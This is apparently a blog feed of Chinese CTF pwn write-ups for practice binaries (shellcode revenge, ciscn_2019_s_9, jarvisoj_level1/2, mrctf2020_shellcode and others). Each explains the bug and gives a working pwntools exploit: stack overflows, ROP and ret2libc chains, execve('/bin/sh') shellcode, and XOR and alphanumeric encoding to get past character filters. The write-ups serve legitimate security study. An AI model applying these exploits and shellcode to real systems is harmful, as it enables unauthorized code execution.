-;;nasm -f elf64 shellcode64.asm;;ld -m elf_x86_64 -o shellcode64 shellcode64.o;;objdump -d shellcode64global _start_start:    mov rbx, &#x27;/bin/sh&#x27;     ; 把字符串&quot;/bin/sh&quot;的地址放到rbx寄存器    push rbx               ; 将&quot;/bin/sh&quot;的地址压入栈    push rsp               ; 把当前栈顶指针（指向&quot;/bin/sh&quot;地址）压入栈    pop rdi                ; 从栈弹出数据到rdi，使rdi指向&quot;/bin/sh&quot;    xor rsi, rsi           ; 清空rsi（argv参数设为0）    xor rdx, rdx           ; 清空rdx（envp参数设为0）    push 0x3b              ; 把系统调用号0x3b压入栈    pop rax                ; 从栈弹出数据到rax，设置系统调用号    syscall                ; 执行系统调用
-
-最麻烦的部分就是/bin/sh和syscall，一个是字符串，另外一个是命令。其中syscall的机器码是0x0f05，汇编的书籍或Intel&#x2F;AMD开发者用书里面也会说到。
-可是syscall不是可见字符啊，更不是A-Z，0-9之间的数值。这要怎么办？
-异或加密异或是一种逻辑运算，A⊕B得到的值是C，而C⊕B之后得到的值就是A。逻辑如下：、
-
-如此，我就可以构造一个这样的设计：
-
-
-我们假设字符’A’为密钥，将syscall作为原始数据输入计算得到加密数据：0x0f05⊕0x4141&#x3D;0x4e44（都为可见字符），所以我们确实可以用它来作为密钥。
-加密后的syscall需要写入内存，但是直接写入的指令mov机器码很显然不是可见字符，而xor为可见字符0x33&#x3D;’3’。或者0x31&#x3D;’1’。
-为什么有两个？是因为xor的运算符定义是这样的：
-xor [a值], [b值]
-
-而在汇编里面，寄存器需要放在前面，其他的放在后面，也就变成了:&lt;font style=&quot;color:rgb(17, 17, 17);&quot;&gt;xor 寄存器, 其他值&lt;/font&gt;，所代表的意思也就是将寄存器里面的值和其他值进行异或处理后，存储到寄存器里面。
-如果我们要实现：&lt;font style=&quot;color:rgb(17, 17, 17);&quot;&gt;xor 其他值, 寄存器&lt;/font&gt;，也就是将其他值和寄存器做异或处理后，将计算后的值存储到其他值里面，这个时候在机器码里面，依旧要按照：&lt;font style=&quot;color:rgb(17, 17, 17);&quot;&gt;xor机器码 寄存器机器码，其他值&lt;/font&gt;的顺序。
-于是就有了两个xor，一个代表的是第一种情况，一个代表第二种情况，分别为&lt;font style=&quot;color:rgb(17, 17, 17);&quot;&gt;0x33&lt;/font&gt;和&lt;font style=&quot;color:rgb(17, 17, 17);&quot;&gt;0x31&lt;/font&gt;
-异或解密syscall这个时候我们就可以开始构造一些东西了，首先看代码，
-我们会发现在jmp到66660000h这个地址前，我们的eax被归0了，所以就可以利用这一点，配合xor来创造
-并且制造出syscall的加密数据形式0x4e444e44（输入两遍是为了防止一遍不运行）
-首先一开始是&lt;font style=&quot;color:rgb(17, 17, 17);&quot;&gt;xor eax,NUM&lt;/font&gt;，实际上是&lt;font style=&quot;color:rgb(17, 17, 17);&quot;&gt;[rdx+0x38]&lt;/font&gt;，为什么是&lt;font style=&quot;color:rgb(17, 17, 17);&quot;&gt;rdx+NUM&lt;/font&gt;？在这里我们看到esi和edx都被复制为了66660000h，实际上这个就是打定了 内存区域中的基地址 ，那为什么偏偏是这个地址呢？这其实有点玄学，因为似乎rdx会作为这个偏移值的基地址，而刚好这边初始化了edx。而大概率选择了rdx作为基地址来偏移。
-我们构造这么一个逻辑：
-
-这里面有很多零碎的知识点，我们先讲一个大概，后面慢慢补充：
-首先是上面的机器码部分，因为程序必须输入可见字符，其中第一部分的可见字符是0x300x39，可见字符’0’‘9’的部分。我在这里输入的是0x33 0x42 addr1，这个代码的汇编样式是：xor rax, [addr1]，目的是将rax里面的值改成’A’，0x42是寄存器rax的机器码。rax的值一开始为0，A⊕0&#x3D;A，而		
-rax==0, [addr]==&#x27;A&#x27;rax=rax⊕[addr1]   =0⊕&#x27;A&#x27;   =&#x27;A&#x27;
-
-通过这一步，我就可以把rax的值改成’A’了。
-然后第二步，使用xor指令配合修改成’A’值的寄存器rax对下面的加密后syscall做处理。第一个加密syscall的起始地址为addr2，利用&lt;font style=&quot;color:rgb(17, 17, 17);&quot;&gt;0x31 0x42 addr2&lt;/font&gt;这个命令，就可以修改addr2中的数据。逻辑为：[addr2] ⊕ rax &#x3D;
-[addr2]==0x4e, rax==&#x27;A&#x27;[addr2]=[addr2]⊕rax       =0x4e⊕0x41       =0x0f
-
-第三步，我们要还原rax寄存器的值为0，为什么？因为我们的核心逻辑是再调用一次read函数，然后读取我们写入的第二段shellcode（可以直接进入&#x2F;bin&#x2F;sh的）到特定的内存里，然后让PC，也就是程序计数器读到第二段shellcode的内容执行即可。用rax里面的值随便找一个’A’做异或即可。
-rax==&#x27;A&#x27; [addr1]==&#x27;A&#x27;rax=rax⊕[addr1]   =&#x27;A&#x27;⊕&#x27;A&#x27;   =&#x27;A&#x27;
-
-如此完成后，即可。
-现在的问题是addr2和addr1应该是多少？
-因为我们输入的addr2和addr1必须是可见字符，也就是0x30-0x39之间的数值，而二遍syscall最多占用四个地址。所以我们把第一个syscall的起始地址addr2放在0x30的位置就行了。中间用pop rcx这种方式来过度，他的机器码刚好也是一个可见字符，而rcx在程序中这个寄存器也没有用到，他里面的值是多少不重要（类似于NOP滑块指令，目的只是塞入值，并且让程序读到这些中间值又可以运行）
-而addr的地址则为0x30后4个数字（因为包括0x30，所以第4个数字实际上是0x33），在第五位的时候塞入数据’A’做填充。一般而言只要两个’A’就行了。我们这边填充8个A。所以第一段的代码就被写出来了：
-payload =  b&#x27;\x33\x42\x38&#x27;  #33 42 38 xor eax, DWORD PTR [rdx+0x38]payload += b&#x27;\x31\x42\x30&#x27;  #31 42 30 xor DWORD PTR [rdx+0x30], eaxpayload += b&#x27;\x33\x42\x38&#x27;  #33 42 38 xor eax, DWORD PTR [rdx+0x38]# payload += b&#x27;\x31\x42\x38&#x27;  #31 42 38 xor DWORD PTR [rdx+0x38], eax 这个可以保证最后rdx0x38里面的值变成A？payload += b&#x27;\x59&#x27;*(0x30-len(payload))  #59 pop rcxpayload += b&#x27;\x4e\x44&#x27;*2    #syscall  0x4e^0x41=0xf 0x44^0x41=0x5payload += b&#x27;A&#x27; * 8        #xor keyp.sendlineafter(&quot;magic\n&quot;,payload)
-
-一些没有讲的小问题
-1、为什么我只异或了0x30地址上的4e，syscall却正常运作了呢？
-不知为何，寄存器不知道调用的是eax还是rax，其实不重要，他会与后面所有的字符A做异或，然后再与两个字节的syscall，也就是两个0x4e44做处理。如果我在这里后面的字符’A’只有两个的话就会与第一个0x4e44做处理，这个是gdb后的结果，原理是什么我也不清楚…所以字符’A’的长度必须大于2，不然0x44的部分就不会被处理了。
-2、如果我把payload中的\x38改成\x3a（也是存有’A’的地址），为什么运行不了呢？
-因为0x3a是字符’:’，不是可见字符……
-第二段shellcode第二段就很简单了，我只需要放入NOP字符滑过和覆盖之前的内容即可，然后再塞入&#x2F;bin&#x2F;sh的shellcode即可。
-p.sendline(b&#x27;\x90&#x27;*0x50+asm(shellcraft.sh()))
-
-
-
-全部代码：#[NewStarCTF 2023 public race]shellcode revengefrom pwn import *context(log_level = &#x27;debug&#x27;, arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;)ip=&#x27;node5.buuoj.cn&#x27;port=27424p = remote(ip,port)payload =  b&#x27;\x33\x42\x38&#x27;  #33 42 38 xor eax, DWORD PTR [rdx+0x38]payload += b&#x27;\x31\x42\x30&#x27;  #31 42 30 xor DWORD PTR [rdx+0x30], eaxpayload += b&#x27;\x33\x42\x38&#x27;  #33 42 38 xor eax, DWORD PTR [rdx+0x38]payload += b&#x27;\x59&#x27;*(0x30-len(payload))  #59 pop rcxpayload += b&#x27;\x4e\x44&#x27;*2    #syscall  0x4e^0x41=0xf 0x44^0x41=0x5payload += b&#x27;A&#x27; * 8        #xor keyp.sendlineafter(&quot;magic\n&quot;,payload)pause()p.sendline(b&#x27;\x90&#x27;*0x50+asm(shellcraft.sh()))p.interactive()
-
-]]></content>
-      <categories>
-        <category>PWN不出来</category>
-      </categories>
-      <tags>
-        <tag>shellcode</tag>
-        <tag>PWN-writeup</tag>
-        <tag>buuctf</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>ciscn_2019_s_9</title>
-    <url>//docx/ciscn_2019_s_9/</url>
-    <content><![CDATA[
-Shellcode 栈溢出
-https://buuoj.cn/challenges#ciscn_2019_s_9
-
-首先checksec一下，看一下大概内容：
-
-IDA打开之后，发现有一个后门函数hint，逻辑如下：
-
-使用此函数的时候，执行esp里面的内容（使用了jmp），我们不需要这些上面什么乱七八糟的东西，我们只需要.text里面的0x08048554的jmp esp就行了。先记下来这是我们可以利用的漏洞。
-
-然后这里是程序唯一一个输入口，也就是说大概率这里有漏洞： 他首先可以让我输入32h的内容，不过通过伪C代码（其实汇编也能看到），这个字符串的长度只有24。也就是说可以构造栈溢出，这个就很简单了。那么我现在构造含有shellcode这样的一个payload：
-
-所以说，大概代码如下：
-from pwn import*context(log_level = &#x27;debug&#x27;, arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;)p = remote(&#x27;node5.buuoj.cn&#x27;,29162)# p = process(&quot;./ciscn_s_9&quot;)#shellcode = asm(shellcraft.sh())shellcode_handmade = asm(&quot;&quot;&quot;    xor eax,eax    push 0x0068732f    push 0x6e69622f    mov ebx, esp     mov al, 0xb    int 0x80                         &quot;&quot;&quot;)jmp_esp_addr = 0x8048554shell = asm(&#x27;&#x27;&#x27;sub esp,0x28call esp&#x27;&#x27;&#x27;)payload = shellcode_handmade.ljust(32+4,b&#x27;a&#x27;) + p32(jmp_esp_addr) + shellprint(payload)p.sendafter(b&#x27;tell?\n&#x27;,payload)p.interactive()
-
-如果直接用shellcraft.sh()的话，生成出来的shellcode就太大了，会超过程序给我们的栈可用长度（38字节）
-]]></content>
-      <categories>
-        <category>PWN不出来</category>
-      </categories>
-      <tags>
-        <tag>shellcode</tag>
-        <tag>PWN-writeup</tag>
-        <tag>buuctf</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>easy-shellcode</title>
-    <url>//docx/easy-shellcode/</url>
-    <content><![CDATA[
-类型：shellcode、栈溢出
-https://www.qsnctf.com/  题目叫做：Easy_Shellcode
-
-
-
-输入然后栈中执行，一开始的时候会输出v4的地址。
-
-PIE每次会随机地址，但是按照人类逻辑的最前面三位不动。通过0x7ff将后面的值全部获取。再return到这里执行shellcode即可。
-exp:
-from pwn import *context(log_level = &#x27;debug&#x27;, arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;)ip=&#x27;challenge.qsnctf.com&#x27;port=34976file_addr = &#x27;./easy-shellcode&#x27;p = remote(ip,port)# p = process(file_addr)elf = ELF(file_addr)v4_addr=int(p.recvline()[2:],16)print(v4_addr)shellcode = asm(shellcraft.sh())payload = shellcodepayload += b&#x27;\x90&#x27;*(0x100-len(shellcode)+8)+p64(v4_addr)# print(payload)p.send(payload)p.interactive()
-
-]]></content>
-      <categories>
-        <category>PWN不出来</category>
-      </categories>
-      <tags>
-        <tag>shellcode</tag>
-        <tag>PWN-writeup</tag>
-        <tag>qsnctf</tag>
-        <tag>栈溢出</tag>
-        <tag>rop</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>jarvisoj_level1</title>
-    <url>//docx/jarvisoj_level1/</url>
-    <content><![CDATA[checksec
-
-
-
-保护全关，32位系统。其中一开始会输出buf的地址
-这个逻辑很简单，我先输入shellcode，然后栈溢出，返回到栈上的buf地址运行即可。
-exp：
-from pwn import *context(log_level = &#x27;debug&#x27;, arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;)ip=&#x27;ip_addr&#x27;port=1111file_addr = &#x27;./jarvisoj_level1&#x27;# p = remote(ip,port)p = process(file_addr)elf = ELF(file_addr)buf_addr = int(p.recvline()[len(&quot;What&#x27;s this:&quot;)+2:-2],16)print(buf_addr)payload = asm(shellcraft.sh())payload += b&#x27;a&#x27;*(136-len(payload)+4)payload += p32(buf_addr)p.send(payload)p.interactive()
-
-这个线上似乎没有setbuf，所以输入和输出有点小问题。
-
-似乎需要我先输入什么才会有反应…
-妈的，虽然是题目的bug，但是也不是没有解决方案。我么构造这么一个payload流程：
-
-他似乎收到回车才会输出地址，那么我就先输入一堆东西然后回车，这样他就会输出地址，又会再次返回到vulnerable函数中再输出一次地址，这个时候我再输入shellcode+返回地址为buf。他就可以去buf执行了。
-似乎还是不行…
-还有一个libc的办法来做，思路是这样的：
-构造rop调用write函数来泄露libc的基地址，并且再次调用main函数，根据libc的基址得到system和&#x2F;bin&#x2F;sh字符串地址，然后再次利用漏洞构造rop调用system(‘\bin\sh’)即可。
-
-from pwn import *from LibcSearcher import *context(log_level = &#x27;debug&#x27;, arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;)ip=&#x27;node5.buuoj.cn&#x27;port=28043file_addr = &#x27;./jarvisoj_level1&#x27;p = remote(ip,port)# p = process(file_addr)elf = ELF(file_addr)main_addr=0x80484b7write_plt=elf.plt[&#x27;write&#x27;]write_got=elf.got[&#x27;write&#x27;]payload =b&#x27;a&#x27; * (0x88 + 0x4 ) + p32(write_plt) + p32(main_addr) +p32(0x1)+p32(write_got)+p32(0x4) p.send(payload)write_addr = u32(io.recv(4))libc=LibcSearcher(&#x27;write&#x27;,write_addr)	libc_base=write_addr-libc.dump(&#x27;write&#x27;)system_addr=libc_base+libc.dump(&#x27;system&#x27;)bin_sh=libc_base+libc.dump(&#x27;str_bin_sh&#x27;)payload =b&#x27;a&#x27; * (0x88 + 0x4) + p32(system_addr) + p32(main_addr)+ p32(bin_sh)p.send(payload)p.interactive()
-
-]]></content>
-      <categories>
-        <category>PWN不出来</category>
-      </categories>
-      <tags>
-        <tag>PWN-writeup</tag>
-        <tag>buuctf</tag>
-        <tag>栈溢出</tag>
-        <tag>rop</tag>
-        <tag>ROP-ret2syscall</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>jarvisoj_level2</title>
-    <url>//docx/jarvisoj_level2/</url>
-    <content><![CDATA[
-ROP-ret2text，栈溢出
-https://buuoj.cn/challenges#jarvisoj_level2
-
-首先checksec一下：
-
-32位，有栈堆不可执行。
-
-main函数调用了system函数，说明我们可以知道system函数的地址，找一下：
-
-system_addr = 0x08048320
-再看一下main函数中调用的另外一个函数vulnerable_function()
-
-非常明显的栈溢出。
-回忆一下栈帧结构：
-
-在这里，我们首先溢出覆盖vulnerable_function()函数的返回地址，将返回地址修改成system函数，然后再往system函数里面塞入参数“&#x2F;bin&#x2F;sh”即可。
-
-在system函数的栈帧结构是这样的：command参数在返回地址的上面，所以我们的payload的构造思路是这样的：
-
-然后还需要一个参数“&#x2F;bin&#x2F;sh”，非常好的是我们不需要自己构造了，在Strings视图里面找到了一个存有此参数的地址，我们直接把这个地址塞进去即可。0x0804A024
-
-exp:
-from pwn import *context(log_level = &#x27;debug&#x27;, arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;)ip=&#x27;node5.buuoj.cn&#x27;port=28815file_addr = &#x27;./jarvisoj_level2&#x27;p = remote(ip,port)# p = process(file_addr)elf = ELF(file_addr)system_addr=0x08048320binsh_str_addr=0x0804A024payload = b&#x27;a&#x27;*(136+4)+p32(system_addr)+b&#x27;a&#x27;*4+p32(binsh_str_addr)print(payload)p.send(payload)p.interactive()
-
-
-
-]]></content>
-      <categories>
-        <category>PWN不出来</category>
-      </categories>
-      <tags>
-        <tag>PWN-writeup</tag>
-        <tag>buuctf</tag>
-        <tag>栈溢出</tag>
-        <tag>rop</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>jarvisoj_level2_64</title>
-    <url>//docx/jarvisoj_level2_64/</url>
-    <content><![CDATA[
-ROP-ret2text，栈溢出
-https://buuoj.cn/challenges#jarvisoj_level2_x64
-
-是jarvisoj_level2的64版本。
-按照32位的思路，我们找一下system函数和“&#x2F;bin&#x2F;sh”即可。
-
-
-system_addr = 0x00000000004004C0
-binsh_str_addr = 0x0000000000600A90
-
-这边的buf栈帧变为128了，需要改一下。其他32位中所有的占4字节的都变成8字节例如saved registers。
-然后，在64位里面，所谓的“形式参数”不再是存储在栈中而是存储在了rdi里面。如图中鼠标指出的所示（因为byd每次截图都截不到只能用手机拍了）
-
-所以我们要把0x0000000000600A90传递给rdi才行。
-
-通过ropper很轻松就能找到这行数据。并且后面还有一个ret我们刚好可以用到。
-其payload构造思路也变成了：
-
-整个流程就是：先调用pop rdi，在rdi里面塞入&#x2F;bin&#x2F;sh的值，随后需要一个ret地址，塞入system地址之后ret指令跳转到system地址。而system会直接调用rdi里面的值，rdi已经变成&#x2F;bin&#x2F;sh了。
-exp:
-from pwn import *file_path = &#x27;./jarvisoj_level2_x64&#x27;context(log_level = &#x27;debug&#x27;, binary=file_path, os = &#x27;linux&#x27;)ip=&#x27;nnode5.buuoj.cn&#x27;port=27500# p = remote(ip,port)p = process(file_path)elf = ELF(file_path)system_addr=0x00000000004004C0system_plt = elf.plt[&#x27;system&#x27;]print(system_plt)binsh_str_addr=0x600A90pop_rdi_ret_addr=0x4006b3payload = b&#x27;a&#x27;*(0x88)+p64(pop_rdi_ret_addr)+p64(binsh_str_addr)+p64(system_plt)print(payload)p.sendafter(&#x27;Input:&#x27;,payload)p.interactive()
-
-后记：我的ubuntu似乎是有点太新了。本地打不通但是远程可以。
-]]></content>
-      <categories>
-        <category>PWN不出来</category>
-      </categories>
-      <tags>
-        <tag>PWN-writeup</tag>
-        <tag>buuctf</tag>
-        <tag>栈溢出</tag>
-        <tag>rop</tag>
-        <tag>ROP-ret2text</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>mrctf2020_shellcode</title>
-    <url>//docx/mrctf2020_shellcode/</url>
-    <content><![CDATA[
-类型：pwn、shellcode 
-https://buuoj.cn/challenges#mrctf2020_shellcode
-
-首先检查文件
-
-大概了解情况之后，根据题目标题，我大概知道是shellcode，然后打开IDA查看一下代码长啥样。
-
-一整个流程是这样的，然后F5也没有办法正常反编译成伪C。
-
-整个使用流程大概如此。
-再回到汇编，在输出之后可以让我读取值。因为call了read函数
-#include &lt;unistd.h&gt;ssize_t read(int fd, void *buf, size_t count);//其中，fd是文件描述符//buf是指向数据将被读取的缓冲区的指针//而count是期望读取的字节数//当调用read函数时，它会尝试从fd指向的文件中读取count个字节的数据到buf所指向的内存中。如果读取成功，函数返回实际读取到的字节数；如果读取到文件末尾或没有可读取的数据，函数返回0；如果发生错误，则返回-1，并将错误代码存入errno中。
-
-
-这边题目给了不少备注，在程序的一开始用了一个buf什么-410h，这个就是rbp的缓冲区。然后在这个下面的时候edx400h的意思是给read函数提供了400h的缓冲区。也就是说我可以输入400的内容并且不会栈溢出。
-通过lea操作符，rax获取了rbp+buf的地址，如果main函数栈从0开始，那么rax现在值就是栈中地址-410h。
-通过read函数不难发现，读取值的void *buf是一个空类型指针，将rax的地址交给他开始读取数据。此时此刻，栈中的数据会被rsi寄存器（这边的寄存器被当作指针用，获取string数据）
-在这里，程序要获取400h的值，那相当多了。获取这些数据要干嘛？接着往下找：
-
-然后，通过一个jg进行跳转，我们先不管这个jump greater的条件。不难发现当判断正确的时候（也就是蓝色的线），会再一次把rbp+buf这个地址交给rax，此时此刻rax就是指向我们刚刚才输入进去的数据的。然后使用了call指令，也就会导致我们输入进去的数据在栈中会被执行。
-我们再回来看这个比较到底是啥：首先mov了eax的值到rbp+ver_4的位置，然后将0和这个值进行比较，如果大于那么就跳转到蓝色部分，否则红色部分。
-不过在read函数调用之前我们就发现，mov eax,0已经把eax寄存器中的值变成0。
-
-在gdb调试后的时候非常神奇，我们的eax虽然被归0了，但是似乎使用完read函数之后，他就莫名其妙的得到了一个0xA的值（并非莫名其妙，最后会讲）。不管如何，他现在反正是大于0的。于是乎我们接下来输入的东西就会被正常执行了，可喜可贺。
-from pwn import*context(log_level = &#x27;debug&#x27;, arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;)shellcode = asm(shellcraft.sh())p = remote(&quot;node5.buuoj.cn&quot;,26437)#p = process(&quot;./mrctf2020_shellcode&quot;)payload = shellcodep.send(payload)p.interactive()
-
-直接用自带工具构造一个shellcode做成payload，一把梭直接结束。
-
-ls后flag在根目录下，直接cat，然后结束。
-孩子们，我们是不是忘记那个奇怪的eax怎么获得0x0A的值了？
-是的，现在我们来回顾一下这个傻逼read函数：
-#include &lt;unistd.h&gt;ssize_t read(int fd, void *buf, size_t count);
-
-fd.、.buf.、.count分别对应edi，rsi和edx三个寄存器。那么ssize_t类型的返回值去哪里了？
-我们做一个实验，其实有理论可以直接说，不过实验对于我而言印象会更深刻。
-
-我们写一个带有返回值的函数，然后编译之后gdb调试一下：
-
-当我们把add中的return给运行完的时候，返回值也就是10+20&#x3D;&#x3D;30，30也就是0x1e的值出现在了rax寄存器上，也就是说，我这个函数运行完之后的返回值会返回到rax寄存器上。而_read函数的返回值是读取了多少数据他就返回多少，于是乎在我们运行完之后，rax的值变成了0x0A。
-也就是说，返回值会默认给0x0A。所以我可以逆向一下，大概源程序的代码是这样的：
-#include &lt;stdio.h&gt;int main() &#123;    setbuf(0,0);    setbuf(0,0);    setbuf(0,0);    char str[410];    if(read(0,str,0x400)&gt;0)        call(str);    return 0;&#125;
-
-这个只是伪C代码，大概这样写不能还原题目。就这样吧…
-]]></content>
-      <categories>
-        <category>PWN不出来</category>
-      </categories>
-      <tags>
-        <tag>shellcode</tag>
-        <tag>PWN-writeup</tag>
-        <tag>buuctf</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>mrctf2020_shellcode_revenge</title>
-    <url>//docx/mrctf2020_shellcode_revenge/</url>
-    <content><![CDATA[
-类型：shellcode 字符审查
-https://buuoj.cn/challenges#mrctf2020_shellcode
-
-一如既往的checksec
-
-打开ida之后我们发现图形化反汇编mian函数里面有很多的跳转。我们直接F5，会报错，说call rax这一行有问题。我们直接右键未定义即可。
-
-看起来是一堆if字符检测，我们拿出离散数学的知识和ASCII码表对照一看就会快速发现这是一个把所有的非字母、非数字常规文本字符给去掉了。只有“qwertyuiopasdfghjklzxcvbnm QWERTYUIOPASDFGHJKLZXCV BNM 1234567890”这些字符。
-然后原理和mrctf2020_shellcode一样，读入什么执行什么。
-我们可以用alpha3工具来帮我们生成这个shellcode：alpha3.py
-ok了，然后我们就得到64位的shellcode字符串化的串为：
-Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2O2u2E0Z7m0n7m0R0b2x2o0Y102x0B7O2A1P2J0n102j0V0l2A0T170Z2j0Y7N0O1O137M0I1P132v0H0V10142v060H0f11000J0q11180I1711160J0Z110h0k060V0y0g2E0m0K170u0n110m2H11120n2n0U1N0f7N0m0H192m0n2n0U10112t0H12131k2k0h0l02102w0m0I112m2w0C01
-
-操，太长了。然后我发现用python2的方法生成的可以打通
-exp如下：
-from pwn import*context(log_level = &#x27;debug&#x27;, arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;)ip=&#x27;node5.buuoj.cn&#x27;port=26117file_addr = &#x27;./mrctf2020_shellcode_revenge&#x27;p = remote(ip,port)#p = process(file_addr)elf = ELF(file_addr)shellcode = b&#x27;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a071N00&#x27;payload = shellcodeprint(payload)p.sendafter(b&#x27;magic&#x27;,payload)p.interactive()
-
-]]></content>
-      <categories>
-        <category>PWN不出来</category>
-      </categories>
-      <tags>
-        <tag>shellcode</tag>
-        <tag>PWN-writeup</tag>
-        <tag>buuctf</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>overflow_ez_32</title>
-    <url>//docx/overflow_ez_32/</url>
-    <content><![CDATA[首先checksec：
-
-保护全关，一般保护全关的题目要么特别简单要么特别难。很显然（因为这是我自己做的题），这个是前者。（当然不是所有带有ez的题目都很ez）（但是这个是真ez）
-直接拖到ida一探究竟。
-
-有一个main函数和一个back_door，还有一个overflow和init函数，backdoor里面是一个超级大后门：
-
-main函数里面是init和overflow，一个是初始化，还有一个是一个最简单的栈溢出：
-
-如图可见，这里有一个不安全的gets函数，然后有一个s变量。
-
-点进去之后我们就能发现，从-0x18到+0x04都是本栈帧的模样，然后要输入0x18个字节覆盖char字符串s和一个var_4，输入4个字节覆盖saved register，最后输入4字节的地址来覆盖return地址。
-所需要的地址就是我们的backdoor函数地址…
-
-backdoor的位置在0x080491F0这个位置上，当然我们也可以填入0x08049211这个地址，这样可以跳过上面那个puts函数的调用。不过这里没必要，我们就以backdoor的地址为需要进入的地址：
-exp：
-from pwn import *#32context(log_level = &#x27;debug&#x27;, arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;)file_addr = &#x27;./overflow_ez_32&#x27;p = process(file_addr)elf = ELF(file_addr)backdoor_addr = 0x080491F0payload = b&#x27;a&#x27;*0x18payload += b&#x27;a&#x27;*0x04payload += p32(backdoor_addr)print(payload)p.sendafter(b&#x27;door?\n&#x27;,payload)p.interactive()
-
-非常简单。
-]]></content>
-      <categories>
-        <category>PWN不出来</category>
-      </categories>
-      <tags>
-        <tag>PWN-writeup</tag>
-        <tag>nxctf</tag>
       </tags>
   </entry>
   <entry>
